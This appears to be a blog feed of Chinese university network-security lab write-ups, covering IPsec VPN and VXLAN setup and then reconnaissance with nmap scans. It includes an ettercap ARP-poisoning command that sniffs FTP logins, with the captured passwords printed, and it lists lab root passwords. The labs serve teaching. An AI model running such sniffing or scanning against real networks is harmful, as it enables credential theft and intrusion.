    #add代表只是添加，但并不会连接，如果为start则代表着启动自动连接
    auto=add</code></pre><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531193605883.png" alt="image-20200531193605883"></p>
<p>3.2两台机器是基于密码来配置的，修改VPN1和VPN2的密码配置文件，分别如下</p>
<p>VPN1如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# cat /etc/ipsec.secrets </span><br><span class="line">include /etc/ipsec.d/*.secrets</span><br><span class="line">192.168.1.11 %any 0.0.0.0 : PSK &amp;quot;123&amp;quot;</span><br></pre></td></tr></table></figure>
<p>VPN2如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# cat /etc/ipsec.secrets </span><br><span class="line">include /etc/ipsec.d/*.secrets</span><br><span class="line">192.168.2.11 %any 0.0.0.0 : PSK &amp;quot;123&amp;quot;</span><br></pre></td></tr></table></figure>
<p>3.3两端重新启动服务，并验证。</p>
<p>VPN1</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl restart ipsec.service</span><br><span class="line">[root@vpn1 ~]# ipsec auto --up net-to-net</span><br></pre></td></tr></table></figure>
<p>VPN2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# systemctl restart ipsec.service</span><br><span class="line">[root@vpn2 ~]# ipsec auto --up net-to-net</span><br></pre></td></tr></table></figure>
<p>必须两台都执行，否则不能成功。<br>显示IPsec SA established tunnel mode 表示连接成功</p>
<p>3.4测试是否可用<br>由于只有两台机器，我们搭建虚拟内网网络来测试。<br>在VPN1上搭建虚拟网络10.0.0.1/24 （步骤了解即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# ip link add left1 type veth peer name left2</span><br><span class="line">[root@vpn1 ~]# ip netns add left</span><br><span class="line">[root@vpn1 ~]# ip link set left1 netns left</span><br><span class="line">[root@vpn1 ~]# ip link set left2 up</span><br><span class="line">[root@vpn1 ~]# ip addr add dev left2 10.0.0.1/24</span><br><span class="line">[root@vpn1 ~]# ip netns exec left ip link set lo up</span><br><span class="line">[root@vpn1 ~]# ip netns exec left ip link set left1 up</span><br><span class="line">[root@vpn1 ~]# ip netns exec left ip addr add dev left1 10.0.0.2/24</span><br><span class="line">[root@vpn1 ~]# ip netns exec left ip route add default via 10.0.0.1</span><br></pre></td></tr></table></figure>
<p>查看虚拟网络，可知绑定IP为10.0.0.2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# ip netns exec left ip a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531194429365.png" alt="image-20200531194429365"></p>
<p>在VPN2上搭建虚拟网络10.0.1.1/24 （步骤了解即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# ip link add left1 type veth peer name left2</span><br><span class="line">[root@vpn2 ~]# ip netns add left</span><br><span class="line">[root@vpn2 ~]# ip link set left1 netns left</span><br><span class="line">[root@vpn2 ~]# ip link set left2 up</span><br><span class="line">[root@vpn2 ~]# ip addr add dev left2 10.0.1.1/24</span><br><span class="line">[root@vpn2 ~]# ip netns exec left ip link set lo up</span><br><span class="line">[root@vpn2 ~]# ip netns exec left ip link set left1 up</span><br><span class="line">[root@vpn2 ~]# ip netns exec left ip addr add dev left1 10.0.1.2/24</span><br><span class="line">[root@vpn2 ~]# ip netns exec left ip route add default via 10.0.1.1</span><br></pre></td></tr></table></figure>
<p>查看虚拟网络，可知绑定IP为10.0.1.2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# ip netns exec left ip a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531194819031.png" alt="image-20200531194819031"></p>
<p>在VPN1上PING测试，可见可以ping通</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# ip netns exec left ping 10.0.1.2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531194845860.png" alt="image-20200531194845860"></p>
<p>4.基于RSA Signature认证方式(RSA数字签名)</p>
<p>上面的认证方式是基于密码，相对不安全，现介绍如何使用数字签名模式认证</p>
<p>4.1 在VPN1和VPN2上分别生成一个新的RSA密钥对，记住后面的key，后面会用到</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# rm -f /dev/random </span><br><span class="line">[root@vpn1 ~]# ln -s /dev/urandom /dev/random</span><br><span class="line">[root@vpn1 ~]# ipsec （） --output /etc/ipsec.secrets</span><br><span class="line">/usr/libexec/ipsec/newhostkey: WARNING: file &amp;quot;/etc/ipsec.secrets&amp;quot; exists, appending to it</span><br><span class="line">Generated RSA key pair with CKAID 040654194d738b0fc942ec2bb8aa9abb7624149c was stored in the NSS database</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531195543184.png" alt="image-20200531195543184"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# ipsec （）--left --ckaid 040654194d738b0fc942ec2bb8aa9abb7624149c</span><br><span class="line">leftrsasigkey&#x3D;0sAwEAAbUpvs46MbqUxc8bzuU58C0H+tMdYj+JrexW8O3f6WmAIhfNXraG6RBuEchvUePABQGH4eCIlxFj6xRLWnndE4HGOEGFds&#x2F;ogtG6jmUaE93FXiSby2Ucefm&#x2F;1DldzNHfneQONo0grR86XWisKgxeV7YjUaqJUFTbYa2iDrivPNqkGqykP6aNpRXk4Kv49mKRKEgGFDpC&#x2F;82qa45hh6ItL0Itq9QkTDqUQxzcA9fp8rz1adfUAOCKZaXMNfaD7zeaI+gJKyX3D7lb0h&#x2F;7Nb8qwloaK1kE3BHvrUDZflqlE26NG&#x2F;+Qfki8a&#x2F;cp1sfphySmrtSaORKraDwspFZPF3jgeZO98rpiv43sNL1oUOBLwMzRWkZ6K4moMSKcrc32JKXu54klWxjVzVYnR+VOLpB4mPW+gPG9Rbi79VzfAsy2aTTKB73mOqHM6LrkMPo09OFTlfRTwKdG5nz1gjilYvYdi+uLQAdHZvYA2BhoSG2UC5mPC2sHwjLt39dcnq7+I2yyiePYECRGXtCveymJfOBlP1oA1LmkXq5HabgCgqRXDFK7IqkQzkaik+pox8xGrBYNBkrJeokjJ7+QkkFsl3eAKQS5ITp0XGmg6y1ltU7QcRbhKkLndJ9ZcaIWJw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531195616745.png" alt="image-20200531195616745"></p>
<p>VPN2 操作同VPN1</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531195749652.png" alt="image-20200531195749652"></p>
<p>4.2修改VPN1和VPN2的配置文件如下图（两机器配置文件相同）<br>    vim /etc/ipsec.conf</p>
<pre><code>conn net-to-net
    # 一端IP地址
    left=192.168.1.11
    #一端内网网段地址
    leftsubnet=10.0.0.0/24
    #一端的标识符，可以任意填写，如果多个连接需要区分
    leftid=@vpn1
    leftnexthop=%defaultroute
    leftrsasigkey=0sAwEAAbUpvs46MbqUxc8bzuU58C0H+tMdYj+JrexW8O3f6WmAIhfNXraG6RBuEchvUePABQGH4eCIlxFj6xRLWnndE4HGOEGFds/ogtG6jmUaE93FXiSby2Ucefm/1DldzNHfneQONo0grR86XWisKgxeV7YjUaqJUFTbYa2iDrivPNqkGqykP6aNpRXk4Kv49mKRKEgGFDpC/82qa45hh6ItL0Itq9QkTDqUQxzcA9fp8rz1adfUAOCKZaXMNfaD7zeaI+gJKyX3D7lb0h/7Nb8qwloaK1kE3BHvrUDZflqlE26NG/+Qfki8a/cp1sfphySmrtSaORKraDwspFZPF3jgeZO98rpiv43sNL1oUOBLwMzRWkZ6K4moMSKcrc32JKXu54klWxjVzVYnR+VOLpB4mPW+gPG9Rbi79VzfAsy2aTTKB73mOqHM6LrkMPo09OFTlfRTwKdG5nz1gjilYvYdi+uLQAdHZvYA2BhoSG2UC5mPC2sHwjLt39dcnq7+I2yyiePYECRGXtCveymJfOBlP1oA1LmkXq5HabgCgqRXDFK7IqkQzkaik+pox8xGrBYNBkrJeokjJ7+QkkFsl3eAKQS5ITp0XGmg6y1ltU7QcRbhKkLndJ9ZcaIWJw==
    right=192.168.2.11
    rightsubnet=10.0.1.0/24
    rightid=@vpn2
    rightnexthop=%defaultroute
    rightrsasigkey=0sAwEAAa8cMIBatj+qSxIv+fg75elY9Vbw2lKNnap4rDsVXrS/gRb65I/IQpbjLswePCOllJ1jF5Y3HDOBTBR4wDGWpVlhY5laKnxQnFPeFMeqdCY6p7NWqN4Khf2Pl6YRo5zPe3P0PXuykv0Ns3ga11EEe/NNmwzL8J/9rd3yxbOIH9/lEaKh6pds0ys6aFZH0V0pwNnc7yg0ESKJ9i+uSDVEeDa+OubQv7+lBGuvCxVjhd/bHaqhGTw2UTw001q+zW4T9qGYuctOn5MWAHZsFXAnKu3wwPGMdHpsVbnZjtIPvsKuuD339H42mGAZ6NM2MLSLbZEaVMnaSv3bdVMBjMCe7ur4/N8suJqmZOofPGBCfV0AkLS5Z6J45eERdHxzmweaeprkamfS8nyMxwJeI7ovHiRfh1+jAufCGdeJ9YgMj4mmeVijLqepsmf0WVhga4XOXiLzRcUtE/DKOvHrE9x9QrWeFQwoQ/fOCLvh40iIn80ggZibeuROqhhU8ms4uers4IRhrhAF4ZUCqcxuHm/viNT0nJ6nN3tKfgp0Yc87S4+xA7S5920iQ/YKGMFF58k1TDQOes8la3yWnPBo4O+WegJDtbvyEXk=
    #add代表只是添加，但并不会连接，如果为start则代表着启动自动连接
    auto=add</code></pre><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531195830609.png" alt="image-20200531195830609"></p>
<p>4.3重新启动服务</p>
<p>VPN1和VPN2都执行下列操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl （）   ipsec.service</span><br><span class="line">[root@vpn1 ~]# ipsec auto --up net-to-net</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531195857249.png" alt="image-20200531195857249"></p>
<p>注：必须两台都执行，否则不能成功。<br>显示IPsec SA established tunnel mode 表示连接成功</p>
<p>4.4 检测<br>在VPN1上PING测试，可见可以ping通</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# ip netns exec left ping 10.0.1.2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531195930954.png" alt="image-20200531195930954"></p>
<p>5.在VPN1和VPN2上清除虚拟内网，停止服务。两台机器都执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# ip netns del left</span><br><span class="line">[root@vpn1 ~]# systemctl stop ipsec</span><br></pre></td></tr></table></figure>



<h2 id="任务五、云计算中基于Overlay技术的隧道网络实现"><a href="#任务五、云计算中基于Overlay技术的隧道网络实现" class="headerlink" title="任务五、云计算中基于Overlay技术的隧道网络实现"></a>任务五、云计算中基于Overlay技术的隧道网络实现</h2><h3 id="【任务描述】-8"><a href="#【任务描述】-8" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在两台台服务器搭建的典型企业局域网环境中，主要完成以下内容：<br>（1）搭建overlay网络实现不同宿主机之间同网段机器相通。<br>（2）检测网络联通性。</p>
<h3 id="【实验目标】-8"><a href="#【实验目标】-8" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><p>1.了解overlay网络的使用场景。<br>2.掌握overlay搭建和使用。<br>3.掌握openvswitch的使用。</p>
<h3 id="【实验工具】-8"><a href="#【实验工具】-8" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>openvswitch</li>
</ul>
<h3 id="【操作步骤】-8"><a href="#【操作步骤】-8" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.在VPN1和VPN2分别安装openvswitch并启动服务</p>
<p>安装openvswitch</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# yum install openvswitch -y</span><br></pre></td></tr></table></figure>
<p>启动服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl start openvswitch.service</span><br></pre></td></tr></table></figure>
<p>查看服务状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl status openvswitch.service</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531200421958.png" alt="image-20200531200421958"></p>
<p>2.配置VPN1</p>
<p>在VPN1上添加名为br0的网桥：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-br br0</span><br></pre></td></tr></table></figure>
<p>给br0网桥分配一个ip</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig br0 10.1.0.1/24 up</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531200502204.png" alt="image-20200531200502204"></p>
<p>3.配置VPN2</p>
<p>在VPN2上添加名为br0的网桥：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-br br0</span><br></pre></td></tr></table></figure>

<p>给br0网桥分配一个ip</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig br0 10.1.0.2/24 up</span><br></pre></td></tr></table></figure>

<p>同vpn1，不放图了</p>
<p>4.搭建VXLAN隧道</p>
<p>在VPN1上设置VXLAN，远端ip设置为VPN2能对外通信的br0的ip。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ovs-vsctl （） br0 vx1 -- <span class="built_in">set</span> interface vx1 <span class="built_in">type</span>=vxlan options:remote_ip=192.168.2.11</span></span><br><span class="line">ovs-vsctl add-port br0 vx1 -- set interface vx1 type=vxlan options:remote_ip=192.168.2.11</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531200723692.png" alt="image-20200531200723692"></p>
<p>查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531200934769.png" alt="image-20200531200934769"></p>
<p>在Host2上设置VXLAN，远端ip设置为Host1能对外通信的br0的ip。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-port br0 vx1 -- set interface vx1 type=vxlan options:remote_ip=192.168.1.11</span><br></pre></td></tr></table></figure>
<p>查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531200958099.png" alt="image-20200531200958099"></p>
<p>5.验证VxLAN隧道<br>在VPN1上ping 10.1.0.2 发现可以通，成功</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531201025131.png" alt="image-20200531201025131"></p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>网安平台实验1</title>
    <url>/2020/05/23/2020-03-16-Network-Security-Experiment-1/</url>
    <content><![CDATA[<h1 id="1-1-网络侦察实验"><a href="#1-1-网络侦察实验" class="headerlink" title="1.1 网络侦察实验"></a>1.1 网络侦察实验</h1><p><strong>1.【【实验描述】】</strong></p>
<p>随着时代的发展和网络的普及，在世界各国、各层次的计算机网络中，储存着大量公开资料和机密资料，由于网络漏洞的存在，为“黑客”入侵计算机网络系统获取机密资料提供了很多便利，这些资料引起了各国军事情报部门的重视，都大力开展利用计算机网络系统来获取情报资料的研究和尝试，这便是网络侦察。</p>
<p>网络侦查是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标主机的所有探测活动。网络侦查有时也被称为“踩点”。通常“踩点”包括以下内容：目标主机的域名、IP地址、操作系统类型、开放了哪些端口，以及这些端口后面运行着什么样的应用程序，这些应用程序有没有漏洞等。那么如何收集信息呢？可以利用与技术无关的“社会工程学”、搜索引擎以及扫描工具。</p>
<p>本实验旨在通过在企业复杂网络场景下的网络侦查应用实战，让学生深刻理解网络侦查的概念、特性和原理，掌握网络侦查相关技术，具备对网络进行侦查、渗透、敏感信息获取以及防网络侦查的技术能力，这对于学生的信息安全技术能力提升、国家网络空间安全战略实施，都有非常重要的意义。</p>
<p>本实验内容共包含4个子任务，分别是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任务一 使用nmap、ettercap进行网络侦查和密码嗅探；</span><br><span class="line">任务二 使用crunch、hydra暴力破解ssh服务登陆密码；</span><br><span class="line">任务三 使用ssh登录目标机，获得敏感信息；</span><br><span class="line">任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息。</span><br></pre></td></tr></table></figure>

<p><strong>2实验目的</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。</span><br><span class="line">2.掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。</span><br><span class="line">3.了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。</span><br><span class="line">4.了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</span><br><span class="line">5.了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。 </span><br><span class="line">6.熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法，掌握获取webshell权限基础上控制目标机的方法。</span><br></pre></td></tr></table></figure>

<p>通过nmap、ettercap、crunch和hydra等工具的学习和使用，能够融会贯通，掌握相关服务如ftp、web等漏洞挖掘、渗透、攻击和利用的原理和方法，掌握自主学习和实践主流企业网络扫描工具的功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，具备企业复杂网络信息安全管理的职业能力和终身学习能力。</p>
<p><strong>3实验工具</strong></p>
<ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nmap" target="_blank" rel="noopener">Nmap</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ettercap" target="_blank" rel="noopener">ettercap</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:crunch" target="_blank" rel="noopener">crunch</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:hydra" target="_blank" rel="noopener">hydra</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:firefox" target="_blank" rel="noopener">Firefox</a>（54.2.0）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:rdesktop" target="_blank" rel="noopener">Rdesktop</a></li>
</ul>
<p><strong>4实验环境</strong></p>
<table>
<thead>
<tr>
<th>操作系统</th>
<th>IP地址</th>
<th>服务器角色</th>
<th>登录账户密码</th>
</tr>
</thead>
<tbody><tr>
<td>kali Linux</td>
<td>192.168.1.2</td>
<td>操作机</td>
<td>用户名：root；密码：Simplexue123</td>
</tr>
<tr>
<td>Ubuntu12</td>
<td>192.168.1.3</td>
<td>目标机</td>
<td>用户名：root；密码：Simplexue123</td>
</tr>
<tr>
<td>Windows2012</td>
<td>192.168.1.4</td>
<td>目标机</td>
<td>用户名：administrator；密码：Simplexue123</td>
</tr>
</tbody></table>
<p>实验拓扑图如下</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316171551313.png" alt="image-20200316171551313"></p>
<h2 id="任务1-使用nmap、ettercap进行网络侦查和密码嗅探"><a href="#任务1-使用nmap、ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务1-使用nmap、ettercap进行网络侦查和密码嗅探"></a>任务1-使用nmap、ettercap进行网络侦查和密码嗅探</h2><h3 id="【实验描述】"><a href="#【实验描述】" class="headerlink" title="【实验描述】"></a>【实验描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用kali集成的扫描工具nmap，对网络进行探测，收集目标网络存活的主机信息，收集主机开放的服务信息。</span><br><span class="line">利用kali集成的嗅探工具ettercap，对FTP服务进行嗅探，获取目标主机的ftp登录密码（提交嗅探到的ftp登录密码）。</span><br></pre></td></tr></table></figure>

<p>通过完成本实验任务，要求学生掌握利用nmap进行网络探测并获取目标主机开放的服务等关键信息的方法；掌握通过ettercap实现对目标主机的服务如ftp进行嗅探的流程、方法和技巧，为完成后续网络侦查和漏洞利用实验任务奠定坚实的网络探测技术基础。</p>
<h3 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。</span><br><span class="line">掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。</span><br><span class="line">了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。</span><br></pre></td></tr></table></figure>

<p>通过nmap、ettercap等工具的学习和使用，能够举一反三，掌握自主学习企业级网络扫描工具功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，最终具备企业复杂网络侦查、漏洞挖掘和信息系统安全管理的职业能力。</p>
<h3 id="【实验工具】"><a href="#【实验工具】" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li><a href="[http://210.42.123.2:8088/doku.php?id=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7:nmap](http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nmap)">nmap</a>（集成于kali linux）</li>
<li><a href="[http://210.42.123.2:8088/doku.php?id=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7:ettercap](http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ettercap)">ettercap</a>（集成于kali linux）</li>
</ul>
<h3 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h3><p>1.</p>
<p>在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、服务、操作系统及版本信息。</p>
<blockquote>
<p>可以使用Kali linux集成的nmap工具来完成【操作步骤】1.1，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p><strong>使用Nmap实现网段内的IP发现：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP ip/mask</span><br><span class="line">nmap -sP 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>可以看到当前网段存活的IP有192.168.1.2\3\4</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316183326844.png" alt="image-20200316183326844"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">探测开放端口及服务</span></span><br><span class="line">快速端口扫描</span><br><span class="line">nmap -F -v 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316183738031.png" alt="image-20200316183738031"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">版本扫描</span></span><br><span class="line">nmap -sV -v taget_ip</span><br><span class="line">nmap -sV -v 192.168.1.3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316184802094.png" alt="image-20200316184802094"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 192.168.1.4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316185228476.png" alt="image-20200316185228476"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">操作系统扫描</span></span><br><span class="line">nmap -O -v target_ip</span><br><span class="line">nmap -O -v 192.168.1.3</span><br><span class="line">nmap -O -v 192.168.1.4</span><br></pre></td></tr></table></figure>

<p>nmap -O -v 192.168.1.3</p>
<p>没有扫描到该主机是Centos7（no exact OS matches for host）</p>
<p>并且向我们请求，如果我们知道目标主机的版本号的话，请把目标的特征哈希值上传HHH</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316185543332.png" alt="image-20200316185543332"></p>
<p>nmap -O -v 192.168.1.4</p>
<p>可以看到猜测192.168.1.4操作系统版本好最高的为windows 2012的，正确</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200506175003615.png" alt="image-20200506175003615"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200316185822712.png" alt="image-20200316185822712"></p>
<p>2.</p>
<p>使用嗅探工具对目标机的vsftpd服务进行嗅探。通过设置监听网卡、主机、开启arp欺骗、启动嗅探等步骤来嗅探网络内的数据包，获取ftp用户名和密码。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的ettercap工具来完成【操作步骤】1.2，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p><strong>ettercap命令使用常用参数：</strong></p>
<ul>
<li>-l 显示可用网卡</li>
<li>-i 选择网卡</li>
<li>-t 协议选择，tcp/udp/all</li>
<li>-p 不进行毒化攻击，只用来嗅探</li>
<li>-F 载入过滤器文件</li>
<li>-V text 将数据包以文本形式显示在屏幕上</li>
<li><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</li>
</ul>
<p><strong>中间人攻击：</strong></p>
<ul>
<li>arp毒化的中间人攻击，arp毒化的原理简单的说就是伪造MAC地址与IP的对应关系，导致数据包由中间人转手出去。这是<strong>本实验使用的方法</strong>。</li>
<li>icmp欺骗</li>
<li>DHCP spoofing</li>
<li>Port Stealing</li>
</ul>
<p>下面的命令在eth1网卡上用自己的filter嗅探ip为192.168.1.3主机在21端口上的所有通信，并把所有的数据包保存成文件名为“sniffeddata”的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</span><br></pre></td></tr></table></figure>

<p>输入之后如下，开始跑了：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200522230352149.png" alt="image-20200522230352149"></p>
<p>嗅探到了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip:192.168.1.3:21-&gt;uesr:hacker  PASS :123456</span><br><span class="line">ip:192.168.1.3:21-&gt;USER: ftp PASS :ftp123</span><br><span class="line">ip:192.168.1.3:21-&gt;USER: hacker  PASS:123456</span><br><span class="line">ip:192.168.1.3:21-&gt;USER: hacker  PASS:123456</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523101447397.png" alt="image-20200523101447397"></p>
<h3 id="【实验结果】"><a href="#【实验结果】" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将嗅探到的ftp登陆密码作为【实验结果】提交，提交成功后该实验任务完成。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523101752836.png" alt="image-20200523101752836"></p>
<h2 id="任务2-使用crunch、hydra暴力破解ssh服务"><a href="#任务2-使用crunch、hydra暴力破解ssh服务" class="headerlink" title="任务2-使用crunch、hydra暴力破解ssh服务"></a>任务2-使用crunch、hydra暴力破解ssh服务</h2><h3 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h3><p>本实验任务在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<ul>
<li><p>利用kali集成的crunch工具，生成密码字典文件。</p>
</li>
<li><p>使用hydra工具暴力破解ssh服务的登陆密码，以便完全控制目标主机系统</p>
</li>
</ul>
<p>通过完成本实验任务，要求学生掌握服务密码破解原理、技术和工具的使用方法，具备娴熟的系统服务密码破解、漏洞挖掘和利用、信息安全管理和防范的职业能力。</p>
<h3 id="【实验目标】-1"><a href="#【实验目标】-1" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ol>
<li><p>了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</p>
</li>
<li><p>了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。</p>
</li>
<li><p>通过crunch和hydra等工具的学习和使用，掌握字典文件的生成、破解密码等常用的漏洞挖掘和利用技术，具备熟练的漏洞挖掘和防攻击能力。</p>
</li>
</ol>
